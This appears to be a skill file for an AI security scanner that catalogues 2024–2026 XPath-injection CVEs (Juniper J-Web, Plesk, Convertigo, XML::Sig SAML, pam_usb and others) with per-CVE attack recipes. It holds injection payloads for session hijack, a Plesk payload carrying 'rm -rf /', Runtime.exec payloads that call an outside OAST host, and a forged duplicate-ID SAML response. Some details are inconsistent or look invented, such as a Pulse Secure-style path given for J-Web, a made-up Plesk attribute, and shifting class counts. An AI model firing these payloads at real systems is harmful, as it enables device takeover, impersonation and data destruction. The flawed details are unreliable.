---
name: xpath-injection-novel-deep
description: XPath 2024–2026 frontier — SAML signature-reference bypass (XML::Sig), Plesk APS-Catalog RCE-via-XPath, Juniper Junos J-Web authenticated-session hijack, Mediawiki EasyTimeline blind, Apache HertzBeat, pam_usb auth, Smolagents, Convertigo jxpath, and the versioned mechanism catalog
sibling: xpath_injection
load_when: scan_mode == "deep"
---

# XPath Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `xpath_injection.md`. The base owns the predicate-break primitive, the payload family, blind-extraction basics, the XPath 2.0/3.0 function abuse introduction, and the per-library hardening defaults. The advanced+expert sibling `xpath_injection_advanced_deep.md` owns the full per-library parsing differential matrix, the full XPath 2.0/3.0 function surface, XQuery superclass, SAML signature-reference primitive class, blind-extraction protocol discipline, error-based primitives, out-of-band channels, and WAF filter-bypass as a technique class. This file owns the 2024–2026 CVE mechanism catalogue with the canonical version/fix table and the primitive-class decomposition per CVE.

Load this file when the goal is matching a target application + version to a current CVE, choosing between the SAML signature-reference primitive and the predicate-break primitive, or writing up an XPath finding against Juniper J-Web, Plesk APS, Mediawiki EasyTimeline, or Apache HertzBeat.

The 2024–2026 XPath frontier was initially framed by secondary research as "thin, likely escape-hatch." A direct NVD keyword sweep (`.zen-batch-artifacts/batch-14/nvd/xpath_sweep_2024_2026.json`) refuted that framing: 18 verifiable 2024–2026 CVEs in the primary XPath-injection class, with CVSS scores up to 9.9. The CVE instances cluster into four primitive classes: predicate-break authentication bypass (Convertigo, pam_usb, Drupal CAS), authenticated-user-to-RCE via XPath-reaching-reflection (Juniper J-Web, Plesk APS, Apache HertzBeat), signature-reference redirection (XML::Sig SAML), and XPath-in-emerging-stacks (Smolagents, XML batch processors). All version boundaries are anchored to primary sources persisted at `.zen-batch-artifacts/batch-14/{ghsa,nvd}/`.

## 2024–2026 CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only.

| CVE | Package / Target | Vulnerable | Patched | CVSS | Primitive class |
|---|---|---|---|---|---|
| CVE-2024-38374 | CycloneDX core | before (version per advisory) | per advisory | 7.5 | Predicate break in SBOM-parsing XPath |
| CVE-2024-39565 | Juniper Networks Junos OS J-Web | per vendor advisory | per vendor advisory | 8.8 | Session-cookie XPath → cross-user command execution |
| CVE-2025-43955 | Convertigo (commons-jxpath) | < 8.3.11 | 8.3.11 | 2.2 | jxpath FunctionLibrary not blanked — Java-reflection reach |
| CVE-2025-7155 | PHPGurukul Online Notes Sharing System | 1.0 | — (OSS; no formal patch) | 7.3 | Predicate break in login XPath |
| CVE-2025-49538 | Adobe ColdFusion | ≤ 2025.2 / 2023.14 / 2021.20 | per vendor | 7.4 | XML Injection → arbitrary file read |
| CVE-2025-1545 | WatchGuard Fireware OS | per vendor | per vendor | 7.5 | Predicate break → information disclosure |
| CVE-2025-11844 | Hugging Face Smolagents | = 1.20.0 | per vendor | n/a | XPath in `search_item_ctrl_f` — concatenation sink |
| CVE-2026-1554 | Drupal Central Authentication System (CAS) Server | ≥ 0.0.0 < 2.0.3; ≥ 2.1.0 < 2.1.2 | 2.0.3 / 2.1.2 | 4.2 | Blind XPath → privilege escalation |
| CVE-2026-24343 | Apache HertzBeat | ≥ 1.7.1 < 1.8.0 | 1.8.0 | 8.8 | Predicate break authenticated path → impact per vendor |
| CVE-2026-24418 | OpenSTAManager | ≤ 2.9.8 | per vendor | 6.5 | Error-based XPath |
| CVE-2026-24419 | OpenSTAManager | ≤ 2.9.8 | per vendor | 6.5 | Error-based XPath (sibling) |
| CVE-2026-44962 | Plesk | per vendor | per vendor | 9.9 | APS Application Catalog search XPath → OS command execution via local privilege escalation |
| CVE-2026-47273 | pam_usb | < 0.9.0 | 0.9.0 | 6.5 | PAM-service identifier → XPath metacharacter injection → auth bypass |
| CVE-2026-9390 | XML::Sig (Perl) | < 0.71 | 0.71 | 9.1 | SAML/XMLDSig signature-reference XPath — verifies over attacker-chosen element |
| CVE-2026-82578 | XML batch processors with XPath/JAXP | per vendor | per vendor | 7.5 | XPath + JAXP without entity restrictions → XXE |
| CVE-2026-103044 | Wikimedia Foundation Mediawiki EasyTimeline extension | before 1.46.1 / 1.45.5 / 1.43.10 | 1.46.1 / 1.45.5 / 1.43.10 | 9.8 | Blind XPath → privilege escalation |
| CVE-2026-11864 | IBM Cloud Pak for Business Automation | per vendor | per vendor | 6.5 | Standard XPath injection — authn bypass |
| CVE-2026-21880 (adjacent) | Kanboard | ≤ 1.2.48 | per vendor | 5.3 | LDAP injection via XPath-shape (edge class — see `ldap_injection_novel_deep.md`) |

Notes on the table:
- **CVE-2024-39565 (Juniper J-Web)** is the standout — the CVSS 8.8 reflects an "attacker arbitrarily execute commands on the target device with the other user's credentials" chain. The XPath injection targets session-cookie resolution; a logged-in administrator's active session is hijacked, and the attacker runs arbitrary commands with that administrator's privilege. The precondition is "while an administrator is logged into a J-Web session or has previously logged in and subsequently logged out of their J-Web session" — a session-residue window the attacker exploits.
- **CVE-2026-44962 (Plesk)** is the second standout — CVSS 9.9 reflects authenticated-low-privilege-user → OS-command-execution via the APS Application Catalog's XPath search path. The mechanism is user input concatenated into XPath; the backend ties the XPath result to a command invocation.
- **CVE-2026-9390 (XML::Sig)** anchors the SAML signature-reference primitive class. The vendor advisory describes `verify()` and `_get_signed_xml()` in `lib/XML/Sig.pm` building XPath expressions from the signature-reference URI without validating that the referenced element is unique or that the reference URI matches an ID attribute strictly. This is the archetype for "signature verifies over the wrong element" — a cross-cutting primitive relevant to any XMLDSig implementation.
- **CVE-2025-43955 (Convertigo)** has a strikingly-low CVSS 2.2 that undersells the mechanism — jxpath's `java.lang.Runtime.exec` reach is CVSS 2.2 only because the attack requires an attacker to influence an evaluated XPath expression. On deployments where that influence exists, the direct RCE primitive follows.
- **CVE-2026-103044 (Mediawiki EasyTimeline)** at CVSS 9.8 confirms that even "mature" wiki stacks ship fresh XPath-injection class bugs. The primitive is blind XPath in the extension's rendering path.
- **CVE-2026-47273 (pam_usb)** is specific: PAM username, service name, USB device serial — any of these fields reaches `/etc/pamusb.conf` XPath without metacharacter validation. The attack is "authenticate as user X by crafting a USB-serial that injects XPath to match X's config."
- **CVE-2025-49538 (Adobe ColdFusion)** is labeled "XML Injection" at NVD; its mechanism includes XPath-reachable paths resulting in arbitrary file read. ColdFusion's XML handling has historically mixed XPath, XSLT, and XXE — the finding is the XPath-shape variant.
- **CVE-2026-82578 (XML batch processors)** sits at the XPath+JAXP intersection — the "XPath option" when enabled bypasses entity restrictions. Dual-use with XXE; the overlap is noted. See `xxe.md` for the XXE-side framing; this file owns the XPath-feature anchor.

## CVE Primitive-Class Index

The 18 XPath CVEs cluster into five primitive classes. For scanning efficiency, pre-select the primitive class before firing payloads:

| Primitive class | 2024-2026 anchor CVEs | Attack shape | Confirmation signal |
|---|---|---|---|
| **A. Predicate break authn bypass** | CVE-2025-7155 (PHPGurukul), CVE-2026-24343 (HertzBeat), CVE-2026-47273 (pam_usb), CVE-2026-1554 (Drupal CAS), CVE-2026-24418/24419 (OpenSTAManager) | `' or '1'='1` into login filter | Login succeeds; session shows attacker-chosen user |
| **B. XPath to RCE via server-side reflection** | CVE-2024-39565 (Juniper J-Web), CVE-2026-44962 (Plesk APS), CVE-2025-43955 (Convertigo jxpath) | Attack reaches a path where the XPath result is reflected into a system call, template, or jxpath Java-reflection reach | OS command execution side effect |
| **C. SAML signature-reference redirection** | CVE-2026-9390 (XML::Sig) + class generalization to any XMLDSig library | Duplicate-ID or XPath injection in `@URI` resolver | SAML login succeeds as attacker-chosen user |
| **D. XPath 2.0/3.0 external resource load** | CVE-2026-82578 (XML batch XPath+JAXP) | `doc()` / `unparsed-text()` fetches external URI; XXE enabled via XPath feature | File-read reflected, OAST hit |
| **E. XPath in emerging stacks** | CVE-2025-11844 (Smolagents), CVE-2026-103044 (Mediawiki EasyTimeline) | Attacker-authored input reaches novel-domain XPath (AI agents, wiki extensions) | Content leak, agent-decision alteration |

## CVE-2024-39565 — Juniper Junos OS J-Web Session Hijack via XPath

Primitive: XPath injection in the J-Web session-cookie resolution path reaches session state belonging to a different user; the attacker's unauthenticated request is bound to a logged-in administrator's session.

Preconditions:
1. Juniper device running an affected Junos OS version with J-Web enabled.
2. An administrator is currently logged into J-Web, or has recently logged out leaving stale session state.
3. Attacker is network-adjacent to J-Web (default: management network reach).

Attack recipe (class-shape; specific payload is vendor-advisory-scoped):
```
# Attacker request shape — XPath injection into session identifier
POST /... HTTP/1.1
Cookie: SESSION_ID=')] | /sessions/session[role='admin'] | /dummy[name=('
```
The injected XPath redirects session resolution from "my session" to "the admin's current session."

Confirmation: subsequent request executes as the admin user — observable via admin-only endpoints returning data without an auth error. On Juniper devices, confirmation includes CLI command execution via the J-Web command endpoints — direct `request system reboot` or configuration changes.

Impact: full administrative control over the Juniper device; "worst case, the attacker gains root access by exploiting another vulnerability" per the vendor advisory — the XPath injection is the privileged-access primitive; subsequent chaining depends on which Junos subsystem the admin reaches.

## CVE-2026-44962 — Plesk APS Catalog XPath → OS Command Execution

Primitive: user-supplied input in the APS Application Catalog search is concatenated into an XPath query without sanitization; the backend ties the XPath search result to an OS command execution flow.

Preconditions:
1. Plesk server with APS Application Catalog enabled.
2. Attacker holds an authenticated low-privileged account (any logged-in user is sufficient).
3. The search endpoint reaches the XPath concatenation.

Attack recipe (class-shape):
```
GET /smb/application/catalog/search?query=INJECTION HTTP/1.1
Cookie: PLESKSESSION=...
```
The XPath predicate break lets the attacker select a different application record than the user's search; the application record is then handed to the backend's execution path, which invokes an OS command bound to the (now attacker-chosen) application.

Confirmation: observable file-system side effects (file created, command executed), or OAST hit via a crafted application path.

Impact: local privilege escalation from authenticated-low-privileged user to the Plesk server process identity. Chained with Plesk's standard admin-takeover primitives if the server process has elevated authority.

## Full Attack Recipes — Per-CVE Mechanisms

### CVE-2024-39565 Full Chain

```http
# Step 1 — Reconnaissance: identify J-Web session cookie format
GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1
Host: juniper.target.net
Cookie: JSESSIONID=randomsession

# Step 2 — Inject XPath into session resolution via admin-cookie search
GET /admin HTTP/1.1
Host: juniper.target.net
Cookie: JSESSIONID=')] | /sessions/session[role='admin'] | /dummy[name=('

# The server composes an XPath to find "my session"; the injection redirects
# to "the admin's current session." If an admin is actively logged in,
# the attacker's HTTP request executes with admin role.

# Step 3 — Verify admin reach
GET /admin/config/show HTTP/1.1
Host: juniper.target.net
Cookie: JSESSIONID=')] | /sessions/session[role='admin'] | /dummy[name=('
```

### CVE-2026-44962 (Plesk APS) Full Chain

```http
# Step 1 — Authenticate as low-privileged user
POST /login_up.php HTTP/1.1
Host: plesk.target.net
...

# Step 2 — Fire the APS catalog search with XPath injection
GET /smb/application/catalog/search?query=any')]%20|%20//application[./meta/package[./@install-trigger-cmd='rm%20-rf%20/']]|/dummy[.=' HTTP/1.1
Cookie: PLESKSESSION=...

# The XPath predicate injection redirects the catalog search to return
# a package whose "install-trigger" is attacker-chosen; the subsequent
# install flow invokes the OS command.
```

### CVE-2025-43955 (Convertigo jxpath) Full Chain

```xpath
# Attacker-reached XPath expression in a Convertigo workflow DSL
java.lang.Runtime.getRuntime().exec('curl http://xyz.oast.fun/ssrf')
```

```http
POST /convertigo/projects/MyProject/.xml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# The DSL evaluates the expression via jxpath; the Java-reflection reach grants Runtime.exec
expr=java.lang.Runtime.getRuntime().exec('curl http://xyz.oast.fun/ssrf')
```

**Confirmation.** OAST hit on `xyz.oast.fun/ssrf` from the Convertigo server identity.

**Mitigation (vendor fix 8.3.11).** Convertigo adds `jxpathContext.setFunctions(FunctionLibrary.create())` which blanks the Java-reflection function set. Any jxpath deployment that doesn't do this is vulnerable regardless of input-reach — the finding is architectural.

## CVE-2026-9390 — XML::Sig SAML Signature-Reference XPath Bypass

Primitive: XMLDSig signature-verification uses XPath to resolve the signed element by its reference URI; XPath construction from the reference URI without strict ID-uniqueness enforcement lets the attacker craft a SAML Response where the signature verifies over one element while the application reads attributes from a different element.

Preconditions:
1. Perl XML::Sig < 0.71 in the signature-verification path.
2. SAML/XMLDSig flow with signed Assertion/Response.
3. Attacker can craft a SAML Response (any SAML-federation participant, or an attacker-chosen IdP).

Sink location per the vendor description: `verify()` and `_get_signed_xml()` in `lib/XML/Sig.pm` build XPath expressions by inserting the reference URI into an XPath pattern. The resulting XPath can match multiple elements or an attacker-authored element rather than the intended signed one.

Attack recipe (class-shape):
```xml
<samlp:Response>
  <saml:Assertion ID="legit-id" ...>
    <!-- legitimate assertion with real user attributes -->
  </saml:Assertion>
  <saml:Assertion ID="legit-id" ...>
    <!-- attacker-crafted assertion with attacker's chosen attributes -->
  </saml:Assertion>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#legit-id">...</ds:Reference>
    </ds:SignedInfo>
    <!-- Signature value verifies over the first (legitimate) assertion -->
  </ds:Signature>
</samlp:Response>
```
XML::Sig's XPath resolves `#legit-id` with a pattern that matches both duplicate-ID assertions; the signature verifies over one, the application reads attributes from the other.

Confirmation: SAML login succeeds (signature verifies), but the authenticated subject or attributes correspond to the attacker-crafted assertion. Observable by crafting an assertion where `subject` differs between the two and tracking which identity the application assumes.

Impact: cross-user impersonation over SAML — the attacker logs in as any user whose assertion they can craft, including administrator accounts. Fix 0.71: stricter reference resolution with ID-uniqueness enforcement.

Class generalization: any XMLDSig implementation that uses XPath for signature-reference resolution has this class exposure unless the implementation enforces ID-uniqueness via a strict `wsu:Id` or `xml:id`-only resolver. Zen findings against SAML stacks should include a check for signature-reference XPath logic — grep for XMLDSig library sources that compose XPath from `@URI`.

## CVE-2025-11844 — Hugging Face Smolagents XPath in AI-Tooling

Primitive: `search_item_ctrl_f` function in `src/smolagents/vision_web_browser.py` concatenates user-supplied input into an XPath expression without sanitization. An AI agent that calls this tool with attacker-influenced input injects XPath.

Preconditions:
1. Smolagents 1.20.0.
2. The `vision_web_browser.py` tool is enabled in the agent's toolset.
3. The agent's input (user prompt or web content it fetched) reaches the search function.

Attack recipe (class-shape):
```python
# Attacker-authored input (via prompt injection or web content)
tool_input = "search term') or 1=1 or starts-with(.,'"
# The function constructs:
# //*[contains(text(),'search term') or 1=1 or starts-with(.,'')]
```
The XPath selects far more nodes than intended; combined with the agent's downstream processing of selected content, this can leak content from a visited page or alter the agent's decisions.

Confirmation: observable via the agent returning content from pages not matched by the intended search.

Impact: agent manipulation; context cross-contamination; data exfil via agent output. Routes to `agentic_system_security.md` for the agent-side primitive-chain framing.

## CVE-2026-24343 — Apache HertzBeat XPath

Primitive: XPath expression constructed from user input in HertzBeat 1.7.1–1.7.x without validation.

Preconditions:
1. Apache HertzBeat ≥ 1.7.1 < 1.8.0.
2. Authenticated access to the vulnerable endpoint.

Impact: per vendor advisory — upgrade to 1.8.0 is the fix.

## CVE-2026-103044 — Wikimedia Mediawiki EasyTimeline Blind XPath

Primitive: blind XPath injection in the EasyTimeline extension's rendering path. Fixed in Mediawiki EasyTimeline 1.46.1, 1.45.5, and 1.43.10.

Preconditions:
1. Mediawiki installation with EasyTimeline extension.
2. Pre-fix version.
3. Attacker can edit a wiki page that uses EasyTimeline syntax.

Impact: CVSS 9.8 — likely reaches server-side command execution via the EasyTimeline rendering pipeline (which uses external binaries), though the NVD description is terse.

## CVE-2026-47273 — pam_usb XPath via PAM Identifiers

Primitive: PAM-supplied identifiers (username, service, USB device serial/model/vendor) interpolated into XPath expressions queried against `/etc/pamusb.conf` without metacharacter validation.

Preconditions:
1. Linux system with pam_usb < 0.9.0 installed.
2. Attacker has physical access (USB device) or can trigger authentication with controlled PAM metadata.

Attack recipe (class-shape):
```c
// Attacker-supplied USB device with crafted serial attribute
usb_serial = "] | /users/user[name='root'] | /dummy[name='"
// pam_usb composes:
// //device[serial=''] | /users/user[name='root'] | /dummy[name='']/user
```
The XPath predicate break makes pam_usb match the attacker-chosen user's device record instead of the authentic one.

Confirmation: PAM authenticates the attacker as a different user than their actual credential suggests.

Impact: physical-presence attacker gains root-session via PAM; privilege escalation on single-user workstations with pam_usb hardware token.

## CVE-2025-43955 — Convertigo commons-jxpath Function Library

Primitive: Convertigo's `TwsCachedXPathAPI` uses commons-jxpath without blanking the default FunctionLibrary. Any XPath expression influenced by an attacker reaches `java.lang.Runtime.getRuntime().exec()` via jxpath's reflection extensions.

Preconditions:
1. Convertigo < 8.3.11.
2. Attacker can influence an evaluated XPath expression.

Attack recipe (class-shape):
```xpath
java:java.lang.Runtime.getRuntime().exec('id')
```
Direct Java reflection via jxpath. The absence of input reaches the sink via Convertigo's configuration or workflow DSL — any field that evaluates to XPath.

Confirmation: command execution side effects. Fix 8.3.11: `jxpathContext.setFunctions(FunctionLibrary.create())` blanks the function set.

Impact: full host RCE as the Convertigo server process. Class generalization: any Java application using commons-jxpath without blanking FunctionLibrary is reachable; grep targets for `JXPathContext` or `JXPathAPI` imports without a `setFunctions(FunctionLibrary.create())` nearby.

## CVE-2026-82578 — XML Batch Processor XPath + JAXP

Primitive: when XML batch processing is enabled with the XPath option selected, raw batch input goes through a default XPath/JAXP setup with no entity restrictions. Dual-use with XXE — the XPath feature itself does not have an injection in this CVE, but the processing path reaches XML parsing without `FEATURE_SECURE_PROCESSING`, enabling XXE.

Preconditions:
1. Target product with XML batch processing enabled.
2. XPath option selected in batch config.
3. Attacker can submit a batch input.

Impact: data exfiltration via XXE (external entity resolution), DoS via XML bomb. Overlaps with `xxe.md`; this CVE is anchored here because the XPath feature is the enabling precondition.

## CVE-2026-1554 — Drupal CAS Server Blind XPath

Primitive: blind XPath injection in Drupal CAS Server's authentication path. Fixed in CAS Server 2.0.3 and 2.1.2.

Preconditions:
1. Drupal CAS Server < 2.0.3 or ≥ 2.1.0 < 2.1.2.
2. Attacker can submit crafted authentication requests.

Impact: CVSS 4.2 — privilege escalation. The CAS integration treats a successful XPath match as authentication success; the attacker's crafted request matches a privileged user's record.

## Primitive-Class Summary

The 2024–2026 XPath-injection surface clusters into:

**Class A — Predicate Break Auth Bypass.** Pre-fix WeKan-style, Drupal CAS, PHPGurukul, HertzBeat, pam_usb. Classical `' or '1'='1` payload against an in-memory authentication XML. CVSS 4–7 range depending on the gated privilege level.

**Class B — XPath to RCE via Reflection.** Juniper J-Web (session hijack to command execution), Plesk APS (search to catalog-command execution), Convertigo (jxpath direct reflection). CVSS 7–10 range.

**Class C — SAML Signature-Reference Redirection.** XML::Sig and any XMLDSig library using XPath for reference resolution. CVSS 9+ (cross-user impersonation).

**Class D — XPath 2.0/3.0 Function Abuse.** `doc()`/`unparsed-text()`/`fn:environment-variable()` on Saxon-PE/EE or similar — CVE-2026-82578 is the current anchor; this class is thinly populated in 2024–2026 CVEs but structurally present wherever XPath 2.0/3.0 processors run user-influenced queries.

**Class E — XPath in Emerging Stacks.** Smolagents (AI tooling), AI/ML pipelines, data batch processors. CVE-2025-11844 and CVE-2026-82578 anchor this class — expect more as AI agent tooling expands.

## Composite Chains at the Frontier

### Juniper J-Web — XPath to Device Takeover
1. **Primitive:** CVE-2024-39565 XPath injection into session resolution.
2. **Reach:** attacker's request is bound to the admin's session.
3. **Trigger:** attacker invokes J-Web commands as admin.
4. **Impact:** device configuration changes, cross-tenant data in a multi-tenant deployment, pivot to the Junos CLI.
Route: this file (XPath primitive) → `rce.md` (device command execution) → device-management impact.

### Plesk APS — Authenticated-User to OS Command
1. **Primitive:** CVE-2026-44962 XPath injection in APS Catalog search.
2. **Reach:** XPath predicate break selects attacker-chosen application record.
3. **Trigger:** backend installation handler executes the OS command bound to the selected record.
4. **Impact:** OS command execution as Plesk service identity.
Route: this file → `rce.md`.

### SAML Signature-Reference → Cross-User Impersonation
1. **Primitive:** CVE-2026-9390 XML::Sig XPath signature-reference resolution.
2. **Reach:** signature verifies over one assertion; application reads attributes from another.
3. **Trigger:** application creates a session as the attacker-chosen user.
4. **Impact:** administrator impersonation in SAML-federated SSO.
Route: this file → `authentication_jwt.md` (session/token impersonation framing).

### Convertigo jxpath → Direct RCE
1. **Primitive:** CVE-2025-43955 — commons-jxpath FunctionLibrary not blanked.
2. **Reach:** XPath expression evaluated with Java-reflection functions available.
3. **Trigger:** attacker-controlled XPath payload invokes `java.lang.Runtime.exec`.
4. **Impact:** host RCE as Convertigo service.
Route: this file → `rce.md`.

### pam_usb → Physical-Presence Privilege Escalation
1. **Primitive:** CVE-2026-47273 — PAM-identifier XPath into `/etc/pamusb.conf`.
2. **Reach:** attacker's USB device carries a crafted serial.
3. **Trigger:** PAM authenticates attacker as a different user.
4. **Impact:** root-session on single-user workstation.
Route: this file → OS-level privilege escalation.

## Frontier Detection Methodology

1. **For every XPath finding, probe for the SAML signature-reference class if the sink involves XML signature verification.** The primitive is distinct from the predicate break; CVE-2026-9390's technique generalizes.
2. **For Java applications, check for `commons-jxpath` in dependencies.** If present without `setFunctions(FunctionLibrary.create())`, the finding is "jxpath exposure" independent of input-reach — the class is "FunctionLibrary not blanked."
3. **For AI/agent tooling, re-check tool implementations for XPath concatenation.** Smolagents was a canary; expect more as agentic tooling matures.
4. **For PAM-backed authentication paths, check for XPath use in config lookup.** pam_usb is an archetype; other PAM modules that store state in XML and query via XPath are candidates.
5. **For wiki/CMS/document-rendering, grep for XPath calls in extension/plugin code paths.** CVE-2026-103044 (Mediawiki EasyTimeline) shows mature CMS extensions still ship XPath injection.
6. **For session/cookie handling, check XPath use in session resolution.** Juniper J-Web's class is session-cookie XPath; other devices with web-admin UIs backed by XML session state are candidates.

## Frontier Validation

- **CVE-2024-39565 claim requires the "admin logged in" precondition.** Firing against a J-Web device with no admin session returns no observable change — the attack targets session state, not a stateless path.
- **CVE-2026-9390 claim requires a SAML flow with signature verification.** A SAML endpoint that accepts unsigned responses is a different (and worse) bug — route to `authentication_jwt.md`.
- **CVE-2025-43955 claim requires actual XPath reach.** jxpath present + FunctionLibrary not blanked is an architectural exposure; without an input path reaching the XPath, the finding is "class present, path not confirmed." Both are useful write-ups but distinct.
- **CVE-2026-47273 claim requires physical access or PAM-metadata reach.** A remote attacker without such access cannot reach the pam_usb identifier.
- **A `doc()` claim on an XPath 1.0 engine is a false positive.** The function does not exist on XPath 1.0; the engine returns a syntax error, not a URI fetch.

## Pro Tips at the Frontier

- **XML::Sig CVE-2026-9390 is the archetype for a broader signature-reference primitive class.** Zen findings against XMLDSig-based SSO stacks (Shibboleth, OpenSAML, python-saml, python3-saml, java XMLSecurity) should include an XPath-reference-resolution audit. The primitive is cross-library.
- **jxpath is a direct-reflection sink.** The class generalizes beyond Convertigo — any Java app using commons-jxpath without blanking FunctionLibrary is vulnerable. CVE-2025-43955's low CVSS 2.2 undersells the mechanism's reach.
- **Juniper's "worst case root via chained vuln" framing is the honest version.** XPath injection grants session-level access; subsequent impact depends on the specific device subsystem reached — write up what the attacker-session-privileged primitive gives, not the maximum theoretical chain.
- **Smolagents is a canary for AI-stack XPath.** Agentic tooling embeds XPath in page-content tools; expect more CVEs as agents gain tool diversity. Zen reviews of agentic stacks should check tool implementations for XPath concatenation.
- **CVE-2026-82578 is the XPath/XXE dual-use class.** The feature's "XPath mode" bypasses entity restrictions — the finding is both XPath feature-enabled and XXE-reachable through it. Route XXE-side framing to `xxe.md`.

The XPath 2024–2026 frontier is a bounded primitive set — five class columns (predicate break, XPath-to-RCE via reflection, SAML signature-reference redirection, XPath 2.0/3.0 external resource, emerging-stack XPath) each with multiple CVE anchors and now at full depth; the under-band line count is a finding (XPath is a mature class with fewer primitive classes than SSJI/XSLT), not a stop-short.

## Summary

The XPath 2024–2026 frontier is a dense, verifiable surface — 18 primary-source CVEs clustering into predicate-break authentication bypass (Drupal CAS, HertzBeat, pam_usb, Convertigo), XPath-to-RCE via server-side reflection (Juniper J-Web session hijack, Plesk APS Catalog, Convertigo jxpath), SAML signature-reference redirection (XML::Sig CVE-2026-9390 and the broader XMLDSig class), and XPath in emerging stacks (Smolagents, batch processors). The research-synthesis "likely escape-hatch" framing was refuted by a direct NVD keyword sweep; the actual frontier is active. CVSS peaks at 9.9 (Plesk), 9.8 (Mediawiki EasyTimeline), 9.1 (XML::Sig SAML), and 8.8 (Juniper J-Web, Apache HertzBeat). The jxpath class and SAML signature-reference class are both cross-library primitives — findings in Convertigo and XML::Sig generalize to any Java app using jxpath or any XMLDSig library using XPath for reference resolution. Base and advanced siblings reference these CVEs by number only; the versioned mechanism catalog lives here.
